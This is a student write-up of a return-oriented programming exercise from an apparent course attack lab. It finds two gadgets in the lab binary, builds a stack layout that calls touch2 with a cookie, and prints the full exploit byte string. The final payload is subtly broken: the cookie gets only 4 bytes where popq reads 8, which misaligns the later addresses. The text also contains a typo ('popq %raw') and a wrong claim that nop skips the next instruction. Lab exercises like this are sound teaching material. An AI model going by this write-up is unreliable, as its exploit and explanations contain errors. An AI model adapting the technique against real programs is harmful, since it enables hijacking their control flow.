# Return-oriented attack
## Level 2
Here we are going to repeat the attack of phase 2, that is, calling touch2 with cookie as the argument. However, this time we will use return-oriented attack instead of code injectio.
Here can be an attack strategy.

```
ADDRESS OF TOUCH2
COOKIE
OVERWRITE RETURN ADDRESS TO GADGET
PADDING
```

where we have

```
GADGET:
popq %rdi
retq
```

This way, when we first return from `getbuf`, we will call the gadget. The gadget will pop the next 8 bytes, which is the value of `cookie`, and store it into register `%rdi`. When the program returns from the call to the gadget, it will call `touch2` with `cookie` as the argument, as desired.

According to the table in the lab instruction, the gadget should have byte code `5f c3`. However, after searching through the gadget farm, there isn't even `5f`. So, we need to take a more indirect strategy: instead of popping `cookie` directly into `%rdi`, we will first pop it into another register and then move the content of that register into `%rdi`. Because cookie only has 4 bytes, we can use `movl` instead of `movq`. So, our goal now is to look for byte code in the gadget farm that stands for

```asm
GADGET1:
popq R
retq

GADGET2:
movl R, %edi
retq
```
that gadget1 pops the stack and stores the value into register `R`, and then gadget2 moves the content from register `R` into `%edi` and then returns.

After looking through the gadget farm, the only candidate of `R` we found is `%rax`. Below are the code snippets that contain the two desired gadgets:

```asm
0000000000401a0d <setval_128>:
  401a0d:	c7 07 58 90 90 c3    	movl   $0xc3909058,(%rdi)
  401a13:	c3                   	retq   

00000000004019fa <getval_167>:
  4019fa:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  4019ff:	c3                   	retq   
```

Note that `58 90 90 c3` is

```asm
popq %rax
nop
nop
ret
```

which is equivalent with

```asm
popq %raw
ret
```

because nop simply increments the instruction pointer by 1, thus skipping the next instruction. It does exactly what we want for gadget 1.

As for `89 c7 c3`, it serves perfectly the function of gadget 2:

```asm
movl %eax, %edi
ret
```

Based on the assembly code above, it is easy to derive that the address of gadget 1 is `401a0d + 2 = 401a0f`, while the address of gadget 2 is `4019fa + 2 = 4019fc`.

We will now make changes to the stack layout accordingly. Here is a reasonable new layout:

```
ADDRESS OF TOUCH2
ADDRESS OF GADGET 2 -> movl %eax, %edi; ret
COOKIE
OVERWRITE RETURN ADDRESS WITH THE ADDRESS OF GADGET 1 -> popq %rax; ret
PADDING
```

whose byte code representation will be

```
df 18 40 00 00 00 00 00
fc 19 40 00 00 00 00 00
6d 9f ca 55
0f 1a 40 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

Thus, the exploit string will be:

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0f 1a 40 00 00 00 00 00 6d 9f ca 55 fc 19 40 00 00 00 00 00 df 18 40 00 00 00 00 00
```
